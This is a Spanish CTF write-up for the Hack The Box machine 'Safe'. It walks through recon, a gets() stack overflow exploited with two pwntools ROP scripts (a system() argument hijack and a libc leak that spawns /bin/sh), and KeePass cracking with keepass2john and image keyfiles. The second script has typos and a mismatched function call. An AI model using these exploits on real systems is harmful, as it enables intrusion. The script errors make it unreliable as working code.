-------
- Tags: #linux #buffer-overflow #information-leakage #rop #libc #python-scripting #keepass #john
-------
## Técnicas utilizadas
- Information Leakage  
- Buffer Overflow [x64] [ROP Attacks using PwnTools] [NX Bypass] [ASLR Bypass]  
- Trying to hijack the argument to the system() function by loading our content in RDI [Way 1]  
- Leaking puts and libc address to make a system call with the argument loaded in RDI[Way 2]
- Abusing keepass to obtain the root password [Privilege Escalation]
## Procedimiento
![[Pasted image 20230713130934.png]]

#### Reconocimiento
Si lanzamos un escaneo con **nmap** podemos ver los siguientes puertos abiertos en la maquina:
```ruby
# nmap -sCV -p22,80,1337 10.10.10.147 -oN Ports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-13 20:08 MST
Stats: 0:01:14 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 20:10 (0:00:37 remaining)
Nmap scan report for 10.10.10.147
Host is up (0.18s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 6d7c813d6a3df95f2e1f6a97e500bade (RSA)
|   256 997e1e227672da3cc9617d74d78033d2 (ECDSA)
|_  256 6a6bc38e4b28f76085b162ff54bcd8d6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Apache2 Debian Default Page: It works
1337/tcp open  waste?
| fingerprint-strings: 
|   DNSStatusRequestTCP: 
|     23:04:36 up 21 min, 0 users, load average: 0.00, 0.00, 0.00
|   DNSVersionBindReqTCP: 
|     23:04:31 up 21 min, 0 users, load average: 0.00, 0.00, 0.00
|   GenericLines: 
|     23:04:17 up 21 min, 0 users, load average: 0.00, 0.00, 0.00
|     What do you want me to echo back?
|   GetRequest: 
|     23:04:23 up 21 min, 0 users, load average: 0.00, 0.00, 0.00
|     What do you want me to echo back? GET / HTTP/1.0
|   HTTPOptions: 
|     23:04:24 up 21 min, 0 users, load average: 0.00, 0.00, 0.00
|     What do you want me to echo back? OPTIONS / HTTP/1.0
|   Help: 
|     23:04:41 up 21 min, 0 users, load average: 0.00, 0.00, 0.00
|     What do you want me to echo back? HELP
|   NULL: 
|     23:04:17 up 21 min, 0 users, load average: 0.00, 0.00, 0.00
|   RPCCheck: 
|     23:04:25 up 21 min, 0 users, load average: 0.00, 0.00, 0.00
|   RTSPRequest: 
|     23:04:25 up 21 min, 0 users, load average: 0.00, 0.00, 0.00
|     What do you want me to echo back? OPTIONS / RTSP/1.0
|   SSLSessionReq: 
|     23:04:42 up 21 min, 0 users, load average: 0.00, 0.00, 0.00
|     What do you want me to echo back?
|   TLSSessionReq, TerminalServerCookie: 
|     23:04:43 up 21 min, 0 users, load average: 0.00, 0.00, 0.00
|_    What do you want me to echo back?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V=7.93%I=7%D=7/13%Time=64B0BC3B%P=x86_64-pc-linux-gnu%r(NU
SF:LL,3F,"\x2023:04:17\x20up\x2021\x20min,\x20\x200\x20users,\x20\x20load\
SF:x20average:\x200\.00,\x200\.00,\x200\.00\n")%r(GenericLines,64,"\x2023:
SF:04:17\x20up\x2021\x20min,\x20\x200\x20users,\x20\x20load\x20average:\x2
SF:00\.00,\x200\.00,\x200\.00\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20
SF:echo\x20back\?\x20\r\n")%r(GetRequest,72,"\x2023:04:23\x20up\x2021\x20m
SF:in,\x20\x200\x20users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200
SF:\.00\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20GET\
SF:x20/\x20HTTP/1\.0\r\n")%r(HTTPOptions,76,"\x2023:04:24\x20up\x2021\x20m
SF:in,\x20\x200\x20users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200
SF:\.00\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20OPTI
SF:ONS\x20/\x20HTTP/1\.0\r\n")%r(RTSPRequest,76,"\x2023:04:25\x20up\x2021\
SF:x20min,\x20\x200\x20users,\x20\x20load\x20average:\x200\.00,\x200\.00,\
SF:x200\.00\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20
SF:OPTIONS\x20/\x20RTSP/1\.0\r\n")%r(RPCCheck,3F,"\x2023:04:25\x20up\x2021
SF:\x20min,\x20\x200\x20users,\x20\x20load\x20average:\x200\.00,\x200\.00,
SF:\x200\.00\n")%r(DNSVersionBindReqTCP,3F,"\x2023:04:31\x20up\x2021\x20mi
SF:n,\x20\x200\x20users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200\
SF:.00\n")%r(DNSStatusRequestTCP,3F,"\x2023:04:36\x20up\x2021\x20min,\x20\
SF:x200\x20users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200\.00\n")
SF:%r(Help,68,"\x2023:04:41\x20up\x2021\x20min,\x20\x200\x20users,\x20\x20
SF:load\x20average:\x200\.00,\x200\.00,\x200\.00\n\nWhat\x20do\x20you\x20w
SF:ant\x20me\x20to\x20echo\x20back\?\x20HELP\r\n")%r(SSLSessionReq,65,"\x2
SF:023:04:42\x20up\x2021\x20min,\x20\x200\x20users,\x20\x20load\x20average
SF::\x200\.00,\x200\.00,\x200\.00\n\nWhat\x20do\x20you\x20want\x20me\x20to
SF:\x20echo\x20back\?\x20\x16\x03\n")%r(TerminalServerCookie,64,"\x2023:04
SF::43\x20up\x2021\x20min,\x20\x200\x20users,\x20\x20load\x20average:\x200
SF:\.00,\x200\.00,\x200\.00\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20ec
SF:ho\x20back\?\x20\x03\n")%r(TLSSessionReq,65,"\x2023:04:43\x20up\x2021\x
SF:20min,\x20\x200\x20users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x
SF:200\.00\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20\
SF:x16\x03\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.79 seconds
```

Un escaneo sobre la web con **whatweb** nos muestra las siguientes tecnologías corriendo por detrás:
```ruby
# whatweb 10.10.10.147
http://10.10.10.147 [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.10.10.147], Title[Apache2 Debian Default Page: It works]
```

------------
#### Information Leakage  
Si visitamos la pagina web, observamos que tenemos la pagina por default de apache2, sin embargo, si revisamos el codigo fuente encontramos un comentario que nos deja una pista:
![[Pasted image 20230713201633.png]]

Basicamente nos dice que podemos descargar un **Binario** de nombre **MyApp** desde la web, asi que si colocamos el nombre del binario en la aplicacion, vemos que se nos descarga.

-------
#### Buffer Overflow [x64] [ROP Attacks using PwnTools] [NX Bypass] [ASLR Bypass] 
##### Trying to hijack the argument to the system() function by loading our content in RDI [Way 1]  
El **Binario** de primeras no parece tener mayor función, si lanzamos un **string** sobre el archivo vemos que se trata de un binario compilado para Linux. Podemos proceder a analizar el binario con **Ghidra**

Vemos que en el **main** hay una llamada a nivel de sistema para ejecutar el comando **uptime**, posteriormente nos pide un input, input que tiene un tamaño de **buffer** definido ( 112 bytes ) y posteriormente obtiene el valor de nuestro input y lo mete en la variable:
```C
undefined8 main(void)

{
  char user_input [112];
  
  system("/usr/bin/uptime");
  printf("\nWhat do you want me to echo back? ");
  gets(user_input);
  puts(user_input);
  return 0;
```

Bien, podemos proceder a crear una cadena con un total de 112 caracteres o más y los colocamos en el programa para ver si se desborda la memoria y observamos que si:
![[Pasted image 20230713201854.png]]

Si hacemos un **file** sobre el archivo, nos indica que el binario es de **x86/x64**, o sea que es de **64 bytes**. Usaremos **gdb** para correr el programa y hacer algunas pruebas en cuanto al desbordamiento de memoria:
```
# gdb myapp
```

Podemos crear un patron para identificar el total de caracteres necesarios para sobreescribir el registro ( esta caso es **$rsp** ):
```
gef> pattern create
```

Para indentificar la cadena necesaria:
```
gef> pattern offset $rsp
```

Ahora que conocemos el total de caracteres, podemos crear una cadena en **python** que contemple el total + otra cadena para vetificar si es correcto:
```
python3 -c 'print("A" * 120 + "B" * 8 + "C" * 8)'
```

y vemos que en efecto, es correcto lo que se nos indico antes:
![[Pasted image 20230713202055.png]]

Con esto hecho, podemos ahora verificar las protecciones del binario con **checksec**, el programa **gdb** ya tiene el suyo por defecto:
```ruby
gef➤  checksec
[+] checksec for '/home/sexcott/Desktop/Machines/Safe/content/myapp'
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```

Y, vemos que cuenta con **Data Execution Prevention** ( NX ). Tenemos que tener en cuenta que hay algunas cosas que desconocemos de la maquina victima aún, no sabemos si el **ASLR** esta activado y tampoco conocemos de cuantos **bytes** es la maquina. Nos podemos apoyar un poco más en **ghidra** para seguir analizando el programa y sacar más conclusiones.

Viendo el programa, podemos intentar atentar contra la propia llamada al sistema que se hace, en vez de ejecutar **/usr/bin/uptime** podemos indicarle que ejecute **/bin/bash** o **/bin/sh**.

**Nota**:

	Convenio de llamadas: rdi, rsi, rdx, rcx, r8, r9. Es el orden que tenemos que tener en cuenta a la hora de pasar argumentos para llamar una funcion. En teoria, nuestro argumento tendriamos que almacenarlo en rdi. 

Bien, nos podemos apoyar de **gdb** para ir visualizando el valor de **rdi**. Lo que haremos sera lo siguiente:

**Crea un breakpoint**:
```
gef> b *main
```

**Hacer un step instruction**:
```
gef> si
```

**Cargar a nivel de string lo que vale un registro**:
```
gef> x/s $rdi
```

Y vemos que, en efecto, su valor es el indicado:
![[Pasted image 20230713202844.png]]

Queremos convertir ese **/usr/bin/uptime** a **/bin/sh**, asi que tenemos que sustituir el valor del **$rdi**, en este caso, usaremos **rop** para utilizar las mismas funciones del codigo. Vemos que existe una función de nombre **Test** que de primeras no se llama en **Main**, si observamos el codigo en **C** no hay nada interesante, sin embargo en **ensambolador** vemos que el mete lo que hay en **RSP** a **RDI** y posterior a esto salta a **R13**.

Podemos hacer que **R13** valga **system()** y al que al ejecutar el programa, lea del **RDI** ( que vale **/bin/sh** ) y nos lance una consola interactiva. Lo podemos automatizar todo en un script de **python**:
```python
#!/usr/bin/python3

from pwn import *

# Creamos un contexto, es decir, al ejecutar el programa se abrir una nueva ventana en Tmux
context(terminal=['tmux', 'new-window'])
context(os='linux', arch='amd64')

# Le indicamos que ejecutara el programa y hara un breakpoint en el main
# p = gdb.debug("./myapp", "b *main")
p = remote("10.10.10.10", 1337)
# p.recvuntil("What do you want me to echo back")

# En teoria son 120 de junk, pero le restamos el total de la cadena /bin/sh + nullbyte para que este al tope.
junk = b"A"*112
null = p64(0x0)
bin_sh = b"/bin/sh\x00"

# Usamos popper ( en gef ) para ver el gadget utilizado en hexadecimal -> gef> ropper --search "pop r13"
pop_r13 = p64(0x401206)

# Sacamos el valor de test con objdump -D ./myapp | grep "test"
test = p64(0x401152)

# Sacamos el valor de system con objdump -D ./myapp | grep "system"
system_plt = p64(0x401040)

payload = junk + bin_sh + pop_r13 + system_plt + null + null + test

p.sendline(payload)
p.interactive()
```

Y con esto obtendriamos una shell en la maquina victima.


**Lista todas las funciones**:
```
gef> info functions
```

**Lista los registros**:
```
gef> i r
```

##### Leaking puts and libc address to make a system call with the argument loaded in RDI[Way 2]
Podemos tratar de lekear **libc** de la maquina victima para asi intentar abusar de este
```python
#!/usr/bin/python3

from pwn import *
context([termina="tmux", 'new-window'])
context([os="linux", arch="amd64"])

p = remote("10.10.10.10", 1337)

junk = b"A"*120

# Sacamos el valor de gef> ropper --search "pop rdi"
pop_rdi = p64(0x40120b)

# Sacamos el valor con objdump -D ./myapp | grep system
system_plt = p64(0x401040)

# Sacamos el valor de Ghidra, si vemos el codigo en ensamblador de main
main = p64(0x40115f)

# Sacamos el valor con objdump -D ./myapp | grep puts, esto lo pasamos a gdb haciendo un b *main y luego un x/i y le pasamos la direccion que sacamos con objdump
got_puts = p64(0x404018)

payload = junk + pop_rdi + got_puts + system_plt + main

print(p.recvline())
p.sendline(payload)
leaked_puts = u64(p.recvline().strip()[7:-11].ljust(8, b"\x00"))
log.info("Leaked puts address: 0x%x" % leaked_puts)

libc_address = leaked_puts - 0x067f90

log.info("Computed libc address: 0x%x" % libc_adress)
bin_sh_address = p64(libc_address + 0x161c19)

payload = junk + pop_rdi + bin_sh_address + system_plt
p.recvline()
p.sendline(payload)
p.interactive()
```

---------
#### Abusing keepass to obtain the root password [Privilege Escalation]
Una vez ganamos acceso a la maquina, podemos ver que en nuestro directorio personal hay un archivo **Kepass**. Podemos intentar traernoslo a nuestro equipo. Pasamos el archivo por **Keepass2John** para generar un hash que vamos a romper de manera offline con **John** o con **Hashcat**. Vemos que la contraseña no se puede crackear ya que no esta contemplatada en el **rockyou.txt**. 

Si nos fijamos una vez más en nuestra carpeta persona, encontramos varias imagenes. Dado que no esta instalada ninguna versión de **Python**, ni **PHP**, tiraremos de **busybox** para iniciar un servicio **HTTP** y descargar las imagenes:
```
# busybox httpd -f -p 4646
```

Intentando ver si se esta aplicando **Steganografia** en las imagenes no llegamos a dar con nada. Lo que queda por hacer es pasar las Imagenes como **KeyFiles** con **KeePass2John** para generar distintos hashes dependiendo de la **Key**:
```
# keepass2john IMG MyPassword.kdbx
```

